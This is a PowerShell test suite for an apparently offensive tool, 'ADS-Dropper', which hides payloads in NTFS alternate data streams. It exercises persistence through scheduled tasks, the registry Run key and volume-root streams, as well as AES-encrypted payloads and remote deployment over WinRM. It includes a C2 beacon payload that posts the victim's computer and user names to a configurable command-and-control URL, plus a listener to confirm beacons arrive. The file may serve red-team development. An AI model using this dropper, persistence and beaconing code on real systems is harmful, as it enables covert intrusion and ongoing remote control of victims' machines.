<#
.SYNOPSIS
    ADS-Dropper Essential Test Suite + C2 Beaconing
#>

[CmdletBinding()] param(
    [switch]$RemoteTest,
    [switch]$Cleanup,
    [string]$BeaconTarget = "http://127.0.0.1:8080/beacon",  # Your C2
    [int]$BeaconTimeout = 20
)

$testDir = "$env:TEMP\ADS-Dropper-Tests"
$scriptPath = (Split-Path $PSScriptRoot)
$beaconLog = "$testDir\beacon.log"

Write-Host "ADS-Dropper Test Suite + C2 Beaconing" -ForegroundColor Cyan

# Simple beacon payload (ideally, it will work with ANY C2)
$beaconPayload = @'
`$wc=New-Object Net.WebClient;`$wc.Headers.Add("User-Agent","Mozilla/5.0")
`$data=@{host=`$env:COMPUTERNAME;user=`$env:USERNAME;beacon="ADS-Dropper-TEST"}|ConvertTo-Json
`$wc.UploadString("$BeaconTarget","POST",$data)
'@

function Start-BeaconListener {
    param([string]$Port = "8080", [string]$LogPath = "$testDir\beacon.log")
    
    $job = Start-Job -ScriptBlock {
        param($Port, $LogPath)
        
        $listener = [System.Net.HttpListener]::new()
        $listener.Prefixes.Add("http://127.0.0.1:$Port/")
        $listener.Start()
        
        "Listener started on port $Port" | Out-File $LogPath
        
        while($listener.IsListening) {
            try {
                $ctx = $listener.GetContext()
                $reader = [System.IO.StreamReader]::new($ctx.Request.InputStream)
                $body = $reader.ReadToEnd()
                $reader.Close()
                
                "[$([DateTime]::Now)] Beacon: $body" | Add-Content $LogPath
                
                $ctx.Response.StatusCode = 200
                $ctx.Response.Close()
            } catch {
                "Error: $_" | Add-Content $LogPath
                break
            }
        }
    } -ArgumentList @($Port, $LogPath)
    
    # Wait for listener to be ready
    Start-Sleep -Seconds 2
    
    # Verify listener is running
    if((Get-Job $job.Id).State -ne 'Running') {
        throw "Beacon listener failed to start"
    }
    
    return $job
}

function Test-LocalDeployment {
    param($Persist, $Encrypt)
    Write-Host "`n[1/5] Local: $($Persist -join ',') $(if($Encrypt){'[AES]'} else {'[Plain]'})" -ForegroundColor Yellow
    
    & "$scriptPath\src\ADS-Dropper.ps1" -Payload $beaconPayload -Persist $Persist -Encrypt:$Encrypt -Randomize -NoExec
    $ads = Get-ChildItem $testDir -Recurse -Filter "*:*" | Where-Object Length -gt 0
    if($ads.Count -eq 0) { throw "No ADS created" }
    
    foreach($p in $Persist) {
        switch($p) {
            'task' { if(!(schtasks /query /tn "*UX*" 2>$null)) { throw "No task" } }
            'reg'  { if(!(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\*" 2>$null)) { throw "No reg" } }
            'volroot' { if(!(Get-ChildItem "C:\:ads_*" 2>$null)) { throw "No volroot" } }
        }
    }
    Write-Host "PASS" -ForegroundColor Green
}

function Test-Beaconing {
    Write-Host "`n[2/5] C2 Beaconing -> $BeaconTarget" -ForegroundColor Yellow
    
    Start-BeaconListener
    Start-Job { & "$using:scriptPath\src\ADS-Dropper.ps1" -Payload $using:beaconPayload -Persist @() } | Wait-Job -Timeout $BeaconTimeout
    
    $hits = Get-Content $beaconLog -ErrorAction SilentlyContinue
    Get-Job | Stop-Job | Remove-Job
    
    if($hits -and ($hits | Select-String "ADS-Dropper-TEST")) {
        Write-Host "BEACON CONFIRMED" -ForegroundColor Green
        Get-Content $beaconLog -Tail 3
    } else {
        throw "No beacon received"
    }
}

function Test-Encryption {
    Write-Host "`n[3/5] AES Encryption" -ForegroundColor Yellow
    & "$scriptPath\src\ADS-Dropper.ps1" -Payload $beaconPayload -Persist @() -Encrypt -Randomize -NoExec
    $ads = Get-ChildItem $testDir -Recurse -Filter "*:*" | Select-Object -First 1
    if($ads.Length -eq 0 -or !(Get-Content $ads.FullName -Raw -match '^[A-Za-z0-9+/=]+$')) {
        throw "Encryption failed"
    }
    Write-Host "PASS" -ForegroundColor Green
}

function Test-Execution {
    Write-Host "`n[4/5] Execution" -ForegroundColor Yellow
    Start-Job { & "$using:scriptPath\src\ADS-Dropper.ps1" -Payload 'Write-Host "EXE"' -Persist @() } | Wait-Job
    Write-Host "PASS" -ForegroundColor Green
}

function Test-Remote {
    param($Target = 'localhost')
    Write-Host "`n[5/5] Remote -> $Target" -ForegroundColor Yellow
    
    if($Target -eq 'localhost' -or (Test-WSMan $Target -ErrorAction SilentlyContinue)) {
        & "$scriptPath\src\ADS-Dropper.ps1" -Payload $beaconPayload -Targets $Target -Persist @('reg') -NoExec
        Write-Host "PASS" -ForegroundColor Green
    } else {
        Write-Warning "WinRM unavailable - skipping"
    }
}

function Test-Cleanup {
    if($Cleanup -or $PSBoundParameters.ContainsKey('Cleanup')) {
        schtasks /delete /f /tn "*UX*" 2>$null | Out-Null
        schtasks /delete /f /tn "*WinSAT*" 2>$null | Out-Null
        Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\*" -ErrorAction SilentlyContinue
        Remove-Item $testDir -Recurse -Force -ErrorAction SilentlyContinue
        Get-ChildItem "C:\:ads_*" -ErrorAction SilentlyContinue | Remove-Item -Force
        Write-Host "`nCleanup complete" -ForegroundColor Green
    }
}

# ═══════════════════════════════ MAIN ═══════════════════════════════
try {
    New-Item $testDir -ItemType Directory -Force | Out-Null
    
    Test-LocalDeployment @('task') $false
    Test-LocalDeployment @('reg') $false
    Test-LocalDeployment @('volroot') $true  # Test AES with volroot
    Test-Beaconing
    Test-Encryption
    Test-Execution
    
    if($RemoteTest) { Test-Remote }
    
    Write-Host "`nALL TESTS PASSED!" -ForegroundColor Green
    
} catch {
    Write-Host "`nFAILED: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
} finally {
    Test-Cleanup
}
